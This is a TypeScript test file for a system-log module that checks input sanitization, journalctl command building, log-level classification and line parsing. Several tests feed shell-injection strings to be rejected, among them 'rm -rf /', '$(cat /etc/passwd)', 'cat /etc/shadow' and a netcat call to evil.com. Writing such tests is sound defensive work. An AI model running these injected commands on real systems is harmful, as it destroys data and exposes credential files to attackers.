import test from 'node:test';
import assert from 'node:assert/strict';
import {
  sanitizeLogFilter,
  escapeShellSingleQuote,
  buildJournalctlCommand,
  classifyLogLevel,
  parseLogLine,
  filterLogEntries,
} from './systemLogs.ts';

test('sanitizeLogFilter defaults and line clamping', () => {
  const def = sanitizeLogFilter({});
  assert.equal(def.lines, 100);
  assert.equal(def.source, 'journald');
  assert.equal(def.unit, undefined);
  assert.equal(def.user, undefined);
  assert.equal(def.priority, undefined);
  assert.equal(def.since, undefined);
  assert.equal(def.grep, undefined);

  // Clamping lines
  assert.equal(sanitizeLogFilter({ lines: 5000 }).lines, 1000);
  assert.equal(sanitizeLogFilter({ lines: -10 }).lines, 1);
  assert.equal(sanitizeLogFilter({ lines: 50 }).lines, 50);
  assert.equal(sanitizeLogFilter({ lines: '250' as any }).lines, 250);
});

test('sanitizeLogFilter validates unit and prevents shell injection', () => {
  assert.equal(sanitizeLogFilter({ unit: 'sshd' }).unit, 'sshd');
  assert.equal(sanitizeLogFilter({ unit: 'tailscaled.service' }).unit, 'tailscaled.service');
  assert.equal(sanitizeLogFilter({ unit: 'NetworkManager' }).unit, 'NetworkManager');
  assert.equal(sanitizeLogFilter({ unit: 'user@1000.service' }).unit, 'user@1000.service');

  // Shell injection attempts must be rejected
  assert.equal(sanitizeLogFilter({ unit: 'sshd; rm -rf /' }).unit, undefined);
  assert.equal(sanitizeLogFilter({ unit: 'sshd && whoami' }).unit, undefined);
  assert.equal(sanitizeLogFilter({ unit: '`reboot`' }).unit, undefined);
  assert.equal(sanitizeLogFilter({ unit: '$(cat /etc/passwd)' }).unit, undefined);
  assert.equal(sanitizeLogFilter({ unit: 'foo | nc evil.com 1337' }).unit, undefined);
});

test('sanitizeLogFilter validates user and prevents shell injection', () => {
  assert.equal(sanitizeLogFilter({ user: 'root' }).user, 'root');
  assert.equal(sanitizeLogFilter({ user: 'core' }).user, 'core');
  assert.equal(sanitizeLogFilter({ user: '1000' }).user, '1000');

  // Shell injection attempts
  assert.equal(sanitizeLogFilter({ user: 'root; rm -rf' }).user, undefined);
  assert.equal(sanitizeLogFilter({ user: 'core && reboot' }).user, undefined);
  assert.equal(sanitizeLogFilter({ user: '`id`' }).user, undefined);
});

test('sanitizeLogFilter normalizes priority and since windows', () => {
  assert.equal(sanitizeLogFilter({ priority: 'err' }).priority, 'err');
  assert.equal(sanitizeLogFilter({ priority: 'Error' }).priority, 'err');
  assert.equal(sanitizeLogFilter({ priority: 'warning' }).priority, 'warning');
  assert.equal(sanitizeLogFilter({ priority: 'warn' }).priority, 'warning');
  assert.equal(sanitizeLogFilter({ priority: 'info' }).priority, 'info');
  assert.equal(sanitizeLogFilter({ priority: 'debug' }).priority, 'debug');
  assert.equal(sanitizeLogFilter({ priority: 'all' }).priority, undefined);
  assert.equal(sanitizeLogFilter({ priority: 'invalid_level; rm -rf' }).priority, undefined);

  assert.equal(sanitizeLogFilter({ since: '15m' }).since, '15 minutes ago');
  assert.equal(sanitizeLogFilter({ since: '1h' }).since, '1 hour ago');
  assert.equal(sanitizeLogFilter({ since: '6h' }).since, '6 hours ago');
  assert.equal(sanitizeLogFilter({ since: '24h' }).since, '24 hours ago');
  assert.equal(sanitizeLogFilter({ since: '7d' }).since, '7 days ago');
  assert.equal(sanitizeLogFilter({ since: 'all' }).since, undefined);
  assert.equal(sanitizeLogFilter({ since: '1h && cat /etc/shadow' }).since, undefined);
});

test('escapeShellSingleQuote properly escapes single quotes', () => {
  assert.equal(escapeShellSingleQuote("hello 'world'"), "hello '\\''world'\\''");
  assert.equal(escapeShellSingleQuote('no-quotes'), 'no-quotes');
});

test('buildJournalctlCommand generates secure and accurate commands', () => {
  // Default journald
  const cmd1 = buildJournalctlCommand({});
  assert.ok(cmd1.includes('journalctl --no-pager -n 100'));
  assert.ok(cmd1.includes('sudo -n journalctl'));

  // Specific unit, priority, and time window
  const cmd2 = buildJournalctlCommand({
    unit: 'sshd',
    priority: 'err',
    since: '1h',
    lines: 50,
  });
  assert.ok(cmd2.includes('-n 50'));
  assert.ok(cmd2.includes('-u sshd'));
  assert.ok(cmd2.includes('-p err'));
  assert.ok(cmd2.includes('--since="1 hour ago"'));

  // Specific user mappings
  const cmdRoot = buildJournalctlCommand({ user: 'root' });
  assert.ok(cmdRoot.includes('_UID=0'));

  const cmdCore = buildJournalctlCommand({ user: 'core' });
  assert.ok(cmdCore.includes('_UID=1000'));

  const cmdUid = buildJournalctlCommand({ user: '2500' });
  assert.ok(cmdUid.includes('_UID=2500'));

  // Source dmesg
  const cmdDmesg = buildJournalctlCommand({ source: 'dmesg', lines: 40 });
  assert.ok(cmdDmesg.includes('-k'));
  assert.ok(cmdDmesg.includes('dmesg -T'));

  // Grep pattern safely quoted
  const cmdGrep = buildJournalctlCommand({ grep: "auth 'failed'" });
  assert.ok(cmdGrep.includes("-g 'auth '\\''failed'\\'''"));

  // Malicious inputs must not contaminate command line
  const cmdMalicious = buildJournalctlCommand({
    unit: 'sshd; rm -rf /',
    user: 'core && reboot',
    priority: 'err | dangerous',
    since: '1h; shutdown',
  });
  assert.ok(!cmdMalicious.includes('rm -rf'));
  assert.ok(!cmdMalicious.includes('reboot'));
  assert.ok(!cmdMalicious.includes('dangerous'));
  assert.ok(!cmdMalicious.includes('shutdown'));
});

test('classifyLogLevel accurately categorizes log entries', () => {
  assert.equal(classifyLogLevel('Oct 18 21:44:43 dev-pc sshd[1110]: failed authentication'), 'error');
  assert.equal(classifyLogLevel('Oct 18 20:46:11 dev-pc kernel: amdgpu: *ERROR* Unsupported format'), 'error');
  assert.equal(classifyLogLevel('CRITICAL: Out of memory killer invoked'), 'error');
  assert.equal(classifyLogLevel('Process 123 segfault at 0000'), 'error');

  assert.equal(classifyLogLevel('WARNING: Connection timeout reached, retrying in 5s'), 'warning');
  assert.equal(classifyLogLevel('DeprecationWarning: buffer() is deprecated'), 'warning');

  assert.equal(classifyLogLevel('DEBUG [rpc] Received 14 bytes message'), 'debug');
  assert.equal(classifyLogLevel('Trace: Stack at line 42'), 'debug');

  assert.equal(classifyLogLevel('Oct 18 21:55:56 dev-pc tailscaled[1099]: magicsock: starting ping'), 'info');
  assert.equal(classifyLogLevel('Starting OpenSSH server daemon...'), 'info');
});

test('parseLogLine parses syslog, ISO, and dmesg timestamps and units', () => {
  // Syslog line
  const entry1 = parseLogLine('Oct 18 21:44:43 dev-pc sshd[1110]: failed authentication for root', 0);
  assert.equal(entry1.timestamp, 'Oct 18 21:44:43');
  assert.equal(entry1.hostname, 'dev-pc');
  assert.equal(entry1.unit, 'sshd[1110]');
  assert.equal(entry1.message, 'failed authentication for root');
  assert.equal(entry1.level, 'error');

  // ISO line
  const entry2 = parseLogLine('2026-10-18T21:57:27-04:00 dev-pc kded6[2645]: Failed to stat /proc/1234', 1);
  assert.equal(entry2.timestamp, '2026-10-18T21:57:27-04:00');
  assert.equal(entry2.hostname, 'dev-pc');
  assert.equal(entry2.unit, 'kded6[2645]');
  assert.equal(entry2.level, 'error');

  // Dmesg line
  const entry3 = parseLogLine('[Sun Oct 18 20:46:11 2026] amdgpu: device initialized', 2);
  assert.equal(entry3.timestamp, 'Sun Oct 18 20:46:11 2026');
  assert.equal(entry3.unit, 'kernel');
  assert.equal(entry3.message, 'amdgpu: device initialized');
  assert.equal(entry3.level, 'info');

  // Fallback
  const entry4 = parseLogLine('Just some arbitrary message without headers', 3);
  assert.equal(entry4.message, 'Just some arbitrary message without headers');
  assert.equal(entry4.level, 'info');
});

test('filterLogEntries filters client-side by text, severity, and unit', () => {
  const entries = [
    parseLogLine('Oct 18 21:44:43 dev-pc sshd[1110]: failed password for root', 0),
    parseLogLine('Oct 18 21:45:00 dev-pc sshd[1110]: accepted publickey for core', 1),
    parseLogLine('Oct 18 21:46:00 dev-pc tailscaled[1099]: warning: peer unreachable', 2),
    parseLogLine('Oct 18 21:47:00 dev-pc caddy[2000]: debug: serving static asset', 3),
  ];

  // Filter by error level
  const errOnly = filterLogEntries(entries, { level: 'error' });
  assert.equal(errOnly.length, 1);
  assert.equal(errOnly[0].unit, 'sshd[1110]');

  // Filter by warning level (warning & higher: error + warning)
  const warnAndHigher = filterLogEntries(entries, { level: 'warning' });
  assert.equal(warnAndHigher.length, 2);

  // Filter by search text
  const searchRoot = filterLogEntries(entries, { search: 'root' });
  assert.equal(searchRoot.length, 1);

  // Filter by unit
  const tailscaleLogs = filterLogEntries(entries, { unit: 'tailscale' });
  assert.equal(tailscaleLogs.length, 1);
  assert.equal(tailscaleLogs[0].unit, 'tailscaled[1099]');
});
